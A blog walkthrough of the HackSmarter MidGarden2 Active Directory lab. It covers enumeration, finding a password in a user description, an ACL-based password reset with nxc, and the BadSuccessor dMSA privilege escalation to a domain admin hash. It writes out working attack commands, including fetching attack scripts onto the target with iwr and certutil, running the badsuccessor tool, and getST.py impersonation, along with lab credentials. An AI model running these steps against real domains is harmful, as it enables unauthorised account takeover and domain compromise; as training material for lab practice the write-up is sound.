---
title: "HackSmarter MidGarden2 Walkthrough  "
date: 2026-06-18 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="2000" height="1120" alt="image" src="https://github.com/user-attachments/assets/732b2b13-ea6d-4889-a5ac-d70b4c20bcf5" />

## Objective/Scope : 

As a member of the Hack Smarter Red Team, you have been assigned to this engagement to conduct a comprehensive penetration test of the client's internal environment.

The client has a mature security posture and has previously undergone multiple internal penetration testing engagements. Given our team's advanced expertise in ethical hacking, the primary objective of this assessment is to identify attack vectors that may have been overlooked in prior engagements.


## Solution : 

We first start by scanning the target : 

<img width="910" height="717" alt="image" src="https://github.com/user-attachments/assets/8f1a7866-14f2-48f3-b4b7-1d095acf909f" />

Looking at the open ports it confirms that this is a Domain Controller (Kerberos,ldap,dns,etc). Since this is an AD machine , i always like to keep this quick checklist in mind when doing it : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Before we start, we need to add the hostname as well as the domain name to our /etc/hosts file , we can use nxc for that : 

<img width="1485" height="449" alt="image" src="https://github.com/user-attachments/assets/2a84611f-68d2-48b6-b57e-d33fe9c85ae5" />

We're already given a set of creds to use : 

```bash
freyja:Fr3yja!Dr@g0n^12
```

We can use them to generate a list of users , test for ASREPROASTING , then kerberoasting ,Password Spraying, check shares , if none of this works we will check Bloodhound for ACLs .

First we generate the user list :

<img width="1612" height="762" alt="image" src="https://github.com/user-attachments/assets/918cfd11-3080-47b2-99a2-01d7f919fdbc" />

Then we check Kerberoasting / ASREPROASTING : 

<img width="1616" height="846" alt="image" src="https://github.com/user-attachments/assets/711d7046-60dc-450b-bc30-75e5561061c8" />

This didn't return anything useful -_-

Moving on to the shares : 

<img width="1794" height="535" alt="image" src="https://github.com/user-attachments/assets/c57cd5ff-429d-4209-a150-5354ea920470" />

We find the scripts share but we can't read it sadly . 

Let's check user's descriptions , maybe they keep passwords there , overall we should test all protocol that includes ldap : 

<img width="1807" height="723" alt="image" src="https://github.com/user-attachments/assets/505053ac-52e6-47c2-9165-28d83a7c778b" />

Indeed, we find a temporary password in Thor's description , we can try spraying it on all users to see if it's valid : 

<img width="1524" height="746" alt="image" src="https://github.com/user-attachments/assets/13a04bd5-ec59-471b-bdfe-56d7b90e0468" />

Only Thor has this password , makes sense . 

```bash
[+] yggdrasil.hacksmarter\Thor:Th0r!W!nt3rFang
```

Now before we start checking this new user's privileges , let's run Bloodhound to get a better view on the Domain : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1893" height="392" alt="image" src="https://github.com/user-attachments/assets/be1443fe-ea94-47fd-bd88-b80e6c99b502" />

Now we can add both of them to Owned Objects and check to see if they got any Oubtound Object Control that we can use .

Our first user didn't have any Useful ACLs we could abuse , but Thor can change the password for the HDOR user :

<img width="1607" height="677" alt="image" src="https://github.com/user-attachments/assets/c4853e2d-e907-4f7d-a3d3-3b90d56f8975" />

And the HDOR user can Winrm to the machine , since he's part of the Remote Management group : 

<img width="1587" height="610" alt="image" src="https://github.com/user-attachments/assets/a5fb6df1-eba7-411e-af6a-1ec8c5d47d95" />

We can change his password using BloodyAD , but i just found out we can do that with nxc as well so let's try it : 

```bash
nxc smb $target -u thor -p 'Th0r!W!nt3rFang' -M change-password -o USER=hodr NEWPASS=WEAK.123
```

<img width="1638" height="699" alt="image" src="https://github.com/user-attachments/assets/52ab0cd7-dae6-43d8-9a9e-afb3d69604de" />

Perfect ! Now we can winrm to the machine : 

<img width="1360" height="749" alt="image" src="https://github.com/user-attachments/assets/7cccc58d-331c-41cd-a3e7-68c2bbda0e2b" />

The flag as always is in the Desktop Folder . 

Now for Privesc , our user didn't have any useful group. If we check Bloodhound , we see 2 Interesting users when we try Shortest Path , first is YMIR and ODIN : 

<img width="1368" height="476" alt="image" src="https://github.com/user-attachments/assets/064f54c5-8860-4cc0-abb4-d6a82144df03" />

Remember the scripts Share we found earlier? let's check it : 

<img width="1208" height="799" alt="image" src="https://github.com/user-attachments/assets/d2b6e70d-b4f5-434e-99fd-6b577a4279e4" />

We find dMSA in these names , found out it was a Hint later on. 

Looking Online for dMSA abuse : 

<img width="1165" height="881" alt="image" src="https://github.com/user-attachments/assets/56951910-f16e-4d10-ad83-c88beccde7c0" />

We find that there is an attack called BadSuccessor : 

*BadSuccessor abuses the dMSA supersession mechanism in Windows Server 2025. An attacker with CreateChild rights on any OU can create a dMSA and set it to supersede an arbitrary privileged account (e.g., a Domain Admin) by manipulating the msDS-ManagedAccountPrecededByLink attribute. The KDC then includes the predecessor's SIDs in the dMSA's Kerberos ticket, granting the attacker those privileges without any legitimate migration having taken place.*

First, what is dMSA? It's a new service account type introduced in Windows Server 2025 instead of managing passwords yourself, AD handles it automatically (same concept as gMSA before it, but gMSA had no migration support). What dMSA adds is a migration feature: you can migrate a service from an old service account to a new one without shutting it down  the old account's privileges get carried over to the new dMSA during the transition. And that's exactly what we're abusing here.

Now to Check fot this attack , nxc has a module for it as well (HAVE TO love nxc !!)

<img width="1920" height="394" alt="image" src="https://github.com/user-attachments/assets/2510c461-84c3-4fdd-aed3-3ab4184beda9" />

Perfect Hodr is already a member of the WebSeerverAdmins group and can create objects in these OU : OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter.

Any OU on the domain can work for this attack to be fair : 

I will try to follow this article to exploit this : 

```bash
https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/
```

We first Download the powershell script then host a python server to be able to transfer the file , since the Target can't access the internet so we won't be able to download it directly : 

<img width="1899" height="578" alt="image" src="https://github.com/user-attachments/assets/f7f42955-a220-4695-a0cf-ad47c3cf2305" />

```bash
# On kali :
https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1
python3 -m http.server 80

# On the Windows machine :

iwr http://10.200.65.135/BadSuccessor.ps1 -OutFile BadSuccessor.ps1
Or
certutil.exe -urlcache -split -f http://10.200.65.135/BadSuccessor.ps1
```

<img width="1363" height="575" alt="image" src="https://github.com/user-attachments/assets/54293d71-5591-4808-bda5-1c4794493cd1" />

If we wanted to verify from the Windows host as well : 

<img width="1669" height="551" alt="image" src="https://github.com/user-attachments/assets/c585092f-d346-49d8-adcc-a3a64c771578" />

Now to see which ones have the create child perms : 

```bash
# On our kali :
wget https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1
python3 -m http.server 80

# On the Windows machine : 
iwr http://10.200.65.135/Get-BadSuccessorOUPermissions.ps1 -OutFile Get-BadSuccessorOUPermissions.ps1
```
<img width="1488" height="642" alt="image" src="https://github.com/user-attachments/assets/c82b9802-d0c6-4996-aabb-6f4a0510c330" />

Basically what nxc gave us earlier but this is in case you needed to run it locally . 

Now to abuse this : 

We need to create a new dMSA account and link it to one of the DA , in this case it's Odin or YMIR . 

<img width="1114" height="668" alt="image" src="https://github.com/user-attachments/assets/9aaa9af2-ff68-48ad-98f2-5b5938d40003" />

There is this method , but there is an easier approach , we can use a tool called Badsuccessor tool for this one : 

```bash
# 1. clone the tool
git clone https://github.com/cybrly/badsuccessor
cd badsuccessor

# 2. create isolated venv
python3 -m venv ~/venvs/badsuccessor
source ~/venvs/badsuccessor/bin/activate

# 3. fix pkg_resources issue (Python 3.13 dropped it)
pip install setuptools==69.5.1 --force-reinstall

# 4. install dependencies
pip install impacket==0.12.0
pip install -r requirements.txt

# 5. run the attack
python3 badsuccessor.py -d yggdrasil.hacksmarter -u hodr -p WEAK.123 --dc-ip $target --attack --target ymir
```

<img width="1564" height="812" alt="image" src="https://github.com/user-attachments/assets/4d3c0fb6-8122-4abd-9d90-09875e6320a2" />

Perfect :

<img width="1275" height="570" alt="image" src="https://github.com/user-attachments/assets/8f96f5f7-4ce7-42ed-899d-47df9a665e4f" />

Now if we ask for a TGT , it should give us the Hash of ymir as well . 

```bash
getST.py 'yggdrasil.hacksmarter/hodr:WEAK.123' -dc-ip $target -impersonate 'FAKE_DMSA$' -dmsa -self
```

<img width="1269" height="415" alt="image" src="https://github.com/user-attachments/assets/d9ec70a5-8454-4e2f-aa4d-ecbdc6138c47" />

Nice we got the Hash for YMIR !!

<img width="1583" height="348" alt="image" src="https://github.com/user-attachments/assets/60755f61-9481-469f-826b-9c50edc5c56d" />

We can either dump the ntds or just login via winrm and get the Root flag :

<img width="1688" height="635" alt="image" src="https://github.com/user-attachments/assets/430e2175-cbbb-4c4c-a516-6a10f1dddf4b" />

I tried reading it using nxc only but AV blocked it :

een detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method

<img width="1826" height="491" alt="image" src="https://github.com/user-attachments/assets/a8882940-1fc9-4a88-bb8a-5fe3af5f5aae" />

Just login via evil-winrm and get the root flag , as usual it's always in the Admin Desktop :

<img width="1584" height="547" alt="image" src="https://github.com/user-attachments/assets/78114e51-6dee-4781-a64e-9f40b05c8746" />

That was all for this lab , see you in the next one :) 
